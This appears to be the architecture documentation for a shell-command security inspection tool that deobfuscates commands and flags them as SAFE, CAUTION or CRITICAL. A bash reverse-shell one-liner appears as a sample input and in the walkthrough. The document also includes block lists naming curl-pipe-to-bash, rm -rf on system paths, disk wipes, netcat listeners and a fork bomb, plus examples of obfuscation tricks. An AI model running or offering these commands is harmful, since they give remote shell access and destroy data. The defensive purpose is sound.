# Linux Command Intent Engine: Deep-Dive Pipeline Architecture

> [!TIP]
> **Interactive Standalone Architecture & Workflow Diagrams (Delivered via Archify)**:
> - **Application System Architecture**: [architecture/app-architecture.html](architecture/app-architecture.html)
> - **Multi-Tool Pipeline Flow**: [architecture/pipeline-workflow.html](architecture/pipeline-workflow.html)
> - **Architecture Directory Overview**: [architecture/README.md](architecture/README.md)


## 1. Executive Overview

The **Linux Command Intent Engine (LCIE)** is a pre-flight security inspection and natural language semantic reasoning system designed to protect Linux environments from catastrophic mistakes, obfuscated shell exploits, and unauthorized system tampering. 

Traditional tools rely either exclusively on static regex pattern matching (which fails against shell obfuscation) or on unconstrained LLM calls (which suffer from hallucinations, high latency, and missed edge cases). LCIE solves this with a **hybrid deterministic-semantic pipeline**:

$$\text{Raw Shell Input} \longrightarrow \text{AST Deobfuscator} \longrightarrow \text{Multi-Tool Consensus} \longrightarrow \text{Grounded AI Synthesis} \longrightarrow \text{Safety Invariants} \longrightarrow \text{Interactive UI}$$

```mermaid
flowchart TD
    subgraph Client["1. Client Tier (React / Vite)"]
        UI_IN[User Input / Script Upload] --> UI_DET[Script Reference Detection]
        UI_DET --> UI_RADAR[Radar Scanner UI Pulse]
        UI_RADAR --> UI_REQ[HTTP POST /api/analyze]
        UI_RESP[Render ImpactCard & IntentExplainer] <-- UI_JSON[Structured IntentAnalysis JSON]
    end

    subgraph API["2. FastAPI Service Gateway"]
        UI_REQ --> ROUTER[app/routers/analyze.py]
        ROUTER --> FACADE[AnalyzerService Facade]
        FACADE --> COORD[PipelineCoordinator]
    end

    subgraph Normalization["3. Tree-Sitter Deobfuscation Engine"]
        COORD --> TREE_SITTER[Tree-Sitter Bash Parser]
        TREE_SITTER --> NORM_PASS1[Quote Stripping & ANSI-C Escapes]
        NORM_PASS1 --> NORM_PASS2[Variable Expansion & $IFS Normalization]
        NORM_PASS2 --> NORM_PASS3[Path Normalization & Glob Canonicalization]
        NORM_PASS3 --> NORM_PASS4[Static Pipeline Decoding: base64/rev]
        NORM_PASS4 --> CLEAN_CMD[Canonical Normalized Command]
    end

    subgraph Toolchain["4. Multi-Tool Inspection Engines (Sequential Context Accumulation)"]
        CLEAN_CMD --> T1[Tool 1: SafeCmd AST Allowlist Engine]
        T1 --> T2[Tool 2: Explainshell & Man7 Ground Truth]
        T2 --> T3[Tool 3: CmdCaliper 768-dim Vector Threat Engine]
        T3 --> T4[Tool 4: Rule-Based Heuristic Security Analyzer]
        T4 --> T5[Tool 5: Aqua Tracee eBPF Sandbox & Script Analyzer]
        T5 --> T6[Tool 6: Grounded AI Reasoner Groq/Ollama]
    end

    subgraph Synthesis["5. Deterministic Coordinator Synthesis & Invariants"]
        T6 --> SYNTH[PipelineCoordinator._synthesize]
        SYNTH --> INV1{Rule Invariants Check}
        INV1 -->|Obfuscation Threat| R_CRIT[Promote Risk: CRITICAL]
        INV1 -->|SafeCmd Policy Block| R_CAUT[Promote Risk: CAUTION]
        INV1 -->|CmdCaliper Harmful| R_CRIT
        INV1 -->|Tracee eBPF Threat| R_CRIT
        INV1 -->|Ports Opened / Sockets| R_CAUT
        R_CRIT --> DEDUP[Deduplicate Warnings, Impact & Alternatives]
        R_CAUT --> DEDUP
        INV1 -->|Clean Benign| DEDUP
        DEDUP --> FINAL_MODEL[Final IntentAnalysis Model]
        FINAL_MODEL --> UI_JSON
    end
```

---

## 2. Phase-by-Phase Technical Walkthrough

### Phase 1: Input Ingestion & Frontend Orchestration
**Key Source Files**: `frontend/src/App.jsx`, `frontend/src/components/CommandInput.jsx`, `frontend/src/components/AnalyzingRadar.jsx`, `frontend/src/services/api.js`

1. **User Interaction & Script Detection**:
   - The user enters a one-liner command (e.g., `find . -type f -name "*.log" -exec rm -f {} +`), pastes a compound pipeline (`cat access.log | grep 500 | awk '{print $1}' | sort | uniq -c`), chooses a preset, or uploads a bash script (`backup.sh`).
   - `CommandInput.jsx` executes a lightweight pre-check via `detectScriptInCommand()` hitting `/api/analyze/detect-script`.
   - If a script execution token (e.g. `./run.sh`, `bash exploit.sh`, `python3 test.py`) is referenced without uploaded content, the UI prompts the user to attach the script for dynamic behavioral analysis.
2. **Radar Sweep Animation**:
   - The client switches state from `INPUT` to `ANALYZING`.
   - `AnalyzingRadar.jsx` triggers an interactive radar sweep visualization while tracking step completion.
3. **HTTP Dispatch**:
   - Dispatches an asynchronous `POST` to `/api/analyze` with:
     ```json
     {
       "command": "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1",
       "cwd": "/home/user/workspace",
       "provider": "groq",
       "model": "groq/compound-mini",
       "api_key": null,
       "script_content": null,
       "script_name": null
     }
     ```

---

### Phase 2: API Gateway & Service Orchestration
**Key Source Files**: `backend/app/routers/analyze.py`, `backend/app/core/analyzer.py`, `backend/app/dependencies.py`

1. **Route Validation**:
   - `backend/app/routers/analyze.py` validates the request payload with Pydantic (`AnalyzeRequest`).
   - Checks for non-empty command strings.
2. **Context Binding**:
   - Resolves working directory context (`cwd`), defaulting to the server runtime directory.
3. **Facade Delegation**:
   - Calls `AnalyzerService.analyze()`, which delegates to `PipelineCoordinator.process()`.

---

### Phase 3: Deterministic AST Deobfuscation
**Key Source Files**: `backend/app/core/pipeline/normalizer.py` (`DeobfuscationEngine`)

Attackers often employ shell syntax obfuscation to bypass static regex rules. The `DeobfuscationEngine` leverages **Tree-Sitter Bash** to parse the syntax tree and systematically neutralize evasions:

1. **Dynamic Evasion Flagging**:
   - Identifies remote execution pipes (`curl ... | bash`, `wget ... | sh`) and network file descriptor redirections (`/dev/tcp/`, `/dev/udp/`).
   - Tags the pipeline context with `STATE: UNRESOLVABLE_DYNAMIC_OBFUSCATION`.
2. **Multi-Pass AST Normalization**:
   - **Lexical Quote Flattening**: `"c""a""t"` and `\c\a\t` $\rightarrow$ `cat`.
   - **ANSI-C Quoting & Escape Sequence Decoding**: `$'\x2f\x62\x69\x6e'` $\rightarrow$ `/bin`.
   - **$IFS and Delimiter Normalization**: Substitutes `$IFS` and `${IFS}` with standard spaces.
   - **Parameter Expansion & Substrings**: Evaluates `${var:offset:length}` and propagates symbol assignments.
   - **Static Decoder Pipelines**: Evaluates static pipelines like `echo "..." | base64 -d` and `echo "..." | rev`.
   - **Path Canonicalization & Globbing**: Normalizes `/bin/../bin//whoami` $\rightarrow$ `/bin/whoami` and resolves binary globs like `/b?n/c?t` $\rightarrow$ `/bin/cat`.

The cleaned command is stored in `PipelineContext.command`.

---

### Phase 4: Sequential Multi-Tool Pipeline
Each tool implements `BasePipelineTool` and inspects the shared `PipelineContext`:

#### 1. SafeCmd AST Allowlist Engine (`safecmd_tool.py`)
- **Technology**: `shfmt` AST extraction and security policy rules.
- **Rules Enforced**:
  - *Remote Code Ingestion*: Blocks downloaders (`curl`, `wget`, `fetch`, `aria2c`) piped to interpreters (`bash`, `sh`, `python`).
  - *Critical Root / System Path Destruction*: Blocks `rm -rf` or `unlink` targeting `/`, `/etc`, `/usr`, `/var`, `/boot`, `/dev`.
  - *Raw Block Device Overwrites*: Blocks `dd of=/dev/sd*`, `mkfs`, `fdisk`, `wipefs`.
  - *Execution Escapes in Benign Utilities*: Detects `-exec` in `find`, `system()` in `awk`, `-c` in `vim`/`nano`.
  - *Unauthorized Network Listeners*: Flags `nc -l`, `netcat -lvnp`, `socat LISTEN`.
  - *Privilege Escalation & SUID*: Flags `chmod +s`, `chmod 777 /`, `LD_PRELOAD`, `LD_LIBRARY_PATH`.
  - *Sensitive Target Redirection*: Flags redirection into `/etc/shadow`, `/root/.ssh`, `/proc/sysrq-trigger`.
  - *Fork Bombs*: Detects recursive fork bomb patterns (`:(){ :|:& };:`).
- **Result**: Sets `context.safecmd_verdict` (`allowed`, `rule_violations`, `extracted_commands`, `redirects`).

#### 2. Explainshell & Man7 Ground Truth (`explainshell_tool.py`, `parser.py`)
- **Technology**: `PipelineCommandParser`, Local SQLite Database (`man7_cache.sqlite`), and live `man7.org` scraper.
- **Mechanism**:
  - Breaks compound pipelines by operators (`|`, `&&`, `||`, `;`, `&`).
  - Detects wrapper commands (`sudo`, `xargs`, `nohup`, `timeout`, `chroot`) and isolates nested targets.
  - Queries SQLite for manpage synopses and exact explanations of all flags used (e.g. `-l`, `-a`, `-h`).
  - If missing locally, scrapes official documentation from `man7.org` in real time.
- **Result**: Sets `context.pipeline_stages`, `context.pipeline_commands`, `context.pipeline_operators`, and `context.manpage_explanation`.

#### 3. CmdCaliper Semantic Vector Threat Engine (`cmdcaliper_tool.py`, `vector_db.py`)
- **Technology**: SentenceTransformer embedding model `Ameya-Kawade/cmdcaliper` (768 dimensions).
- **Mechanism**:
  - Generates dense vector embeddings of the user command.
  - Performs cosine similarity matching against a curated vector corpus of offensive shell commands, exploits, and benign administration tasks.
  - Classifies as `HARMFUL`, `SUSPICIOUS`, or `BENIGN`.
  - Maps matches to MITRE ATT&CK techniques (e.g., `T1059.004` Command and Scripting Interpreter: Unix Shell).
- **Result**: Sets `context.cmdcaliper_verdict` with confidence score, nearest neighbor match, and MITRE classification.

#### 4. Rule-Based Heuristic Security Analyzer (`heuristic_tool.py`)
- **Technology**: Domain heuristics covering 11 system operational categories.
- **Capabilities**:
  - Maps **Filesystem Impact**: created, modified, and deleted paths.
  - Maps **Network Impact**: outbound IP endpoints, URLs, downloads, and opened ports.
  - Evaluates **Reversibility**: marks operations irreversible if files are unlinked (`rm`), partitions formatted (`mkfs`), or processes killed (`kill -9`).
  - Generates **Contextual Safer Alternatives**: provides safer variants (e.g., `rm -i` or `trash-put` instead of `rm`, `kill -15` instead of `kill -9`).
- **Result**: Sets `context.filesystem`, `context.network`, `context.heuristic_risk`, `context.heuristic_is_reversible`, and `context.suggested_alternatives`.

#### 5. Aqua Tracee eBPF Sandbox & Script Analyzer (`script_tool.py`)
- **Technology**: Aqua Tracee eBPF kernel monitoring inside a Docker sandbox container.
- **Mechanism**:
  - Dynamically runs uploaded scripts in an isolated container while kernel eBPF probes trace syscalls (`execve`, `connect`, `openat`, `ptrace`).
  - Detects unauthorized outbound socket connections, accesses to `/etc/shadow` or SSH keys, and heuristic attack signatures.
  - Falls back to static AST audit if the sandbox is unreachable.
- **Result**: Sets `context.script_verdict` with runtime security alerts and severity levels.

#### 6. Grounded AI Reasoner (`llm_tool.py`)
- **Technology**: Groq LPU (low-latency inference), local Ollama SLMs, OpenRouter, Google Gemini, or OpenAI.
- **Grounded Prompting Strategy**:
  - The model is not asked to speculate on command intent from scratch.
  - The prompt is synthesized using **ground truth** from prior tools: deobfuscated syntax, official manpage flag definitions, AST rule violations, CmdCaliper vector matches, and heuristic filesystem/network impacts.
  - Enforces strict JSON output containing:
    - *Executive Synopsis*: Concise intent summary.
    - *Operational Impact Breakdown*: Detailed category analysis.
    - *Risk Level & Alternatives*: Grounded security guidance.
  - Features SHA-256 prompt response caching and automatic fallback provider cascades.
- **Result**: Sets `context.llm_intent`, `context.llm_risk`, and grounded suggestions.

---

### Phase 5: Synthesis & Hard Safety Invariants
**Key Source File**: `backend/app/core/pipeline/coordinator.py` (`_synthesize`)

To eliminate AI hallucinations and ensure safety, `_synthesize` enforces hard safety invariants:

| Trigger Condition | Enforced Invariant Risk | Enforced Reversibility |
| :--- | :--- | :--- |
| Dynamic Obfuscation (`STATE: UNRESOLVABLE_DYNAMIC_OBFUSCATION`) | **CRITICAL** | `False` |
| SafeCmd Rule Violation (disallowed command/path/pipe) | $\ge$ **CAUTION** | Contextual |
| CmdCaliper Verdict = `HARMFUL` | **CRITICAL** | `False` |
| CmdCaliper Reverse Shell / Exploit (similarity $\ge 0.50$) | **CRITICAL** | `False` |
| Tracee eBPF Script flagged Malicious / Severity `CRITICAL` | **CRITICAL** | `False` |
| Local Network Ports Opened / Listeners Bound | $\ge$ **CAUTION** | Contextual |
| Critical File Deletion / Raw Disk Write / SIGKILL | **CRITICAL** or **CAUTION** | `False` |
| Read-Only Inspection Command (`ls`, `ps`, `cat`, `tree`) | **SAFE** | `True` |

The coordinator synthesizes all findings into a unified `IntentAnalysis` model.

---

### Phase 6: Frontend Presentation & Interactive Review
**Key Source Files**: `frontend/src/components/ImpactCard.jsx`, `frontend/src/components/IntentExplainer.jsx`

1. **State Transition**: App state moves from `ANALYZING` to `CONFIRMATION`.
2. **Impact Card Rendering**:
   - **Executive Risk Banner**: Displays dynamic color badges (`SAFE` emerald, `CAUTION` amber, `CRITICAL` rose) with animated pulses.
   - **Natural Language Intent & Reasoning (`IntentExplainer.jsx`)**:
     - *Executive Synopsis*: Visual summary with inline markdown parsing.
     - *Operational Impact & Risk Matrix*: Grid cards displaying security warnings, filesystem changes, network connections, and system alterations.
     - *Reversibility Callout*: Explicit guidance on whether actions can be undone.
   - **Pipeline Breakdown Strip**: Shows each command stage, operator badges (`|`, `&&`, `||`), flag explanations with manpage summaries, and direct links to official manpages.
   - **Threat Intelligence Panel**: Displays SafeCmd status, CmdCaliper vector similarity percentage, nearest neighbor attack signature, and MITRE ATT&CK technique tags.
   - **One-Click Safer Alternatives**: Provides interactive buttons to adopt recommended safer commands instantly.

---

## 3. Data Flow & Core Model Reference

```typescript
interface IntentAnalysis {
  command: string;                          // Normalized shell command
  intent: string;                           // Grounded natural language explanation
  risk_level: "SAFE" | "CAUTION" | "CRITICAL"; // Final invariant-enforced risk
  is_reversible: boolean;                   // Reversibility flag
  reversibility_explanation: string;        // Reversibility justification
  
  // Blast Radius Impact
  filesystem: {
    created: string[];
    modified: string[];
    deleted: string[];
  };
  network: {
    outbound_endpoints: string[];
    ports_opened: number[];
    downloads: string[];
  };
  system_state_changes: string[];
  warnings: string[];
  suggested_alternatives: string[];

  // Execution Telemetry
  tools_used: string[];
  model_used: string;
  analysis_time_ms: number;
  
  // Tool Evidence Data
  safecmd?: SafeCmdVerdict;
  cmdcaliper?: CmdCaliperVerdict;
  manpage_explanation?: CommandExplanation;
  pipeline_stages?: PipelineStage[];
  pipeline_operators?: PipelineOperatorInfo[];
  script_analysis?: ScriptAnalysisVerdict;
}
```

---

## 4. End-to-End Walkthrough Example

### Example: Obfuscated Reverse Shell Injection
```bash
/bin/bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
```

1. **Input**: User submits the command via the web interface.
2. **Normalization**:
   - `DeobfuscationEngine` identifies the `/dev/tcp/` redirection descriptor.
   - Appends warning: `[Deobfuscation Threat] Payload relies on unresolvable dynamic state or obfuscation`.
3. **SafeCmd Tool**:
   - `shfmt` extracts `bash -i` and `>& /dev/tcp/10.10.14.1/4444`.
   - Triggers Rule 4 violation: `Interactive reverse shell: bash network socket descriptor '/dev/tcp/' detected.`
   - Sets `allowed: false`.
4. **Explainshell Tool**:
   - Maps `bash` binary; explains `-i` flag as interactive shell mode.
5. **CmdCaliper Tool**:
   - Vector embedding produces a 94.2% cosine match with known reverse shell patterns.
   - Classifies as `HARMFUL`, Category: `Reverse Shell`, MITRE Technique: `T1059.004`.
6. **Heuristic Tool**:
   - Extracts remote endpoint `10.10.14.1:4444`.
   - Determines non-reversible network socket connection.
7. **AI Reasoner**:
   - Synthesizes findings and generates an explanation highlighting unauthorized remote access risks.
8. **Pipeline Invariant Enforcement**:
   - Reverse Shell pattern + SafeCmd block + CmdCaliper Harmful verdict locks risk rating to **`CRITICAL`** and `is_reversible: false`.
9. **UI Display**:
   - `ImpactCard` displays a glowing rose alert.
   - Highlights MITRE ATT&CK technique T1059.004 and remote target `10.10.14.1:4444`.
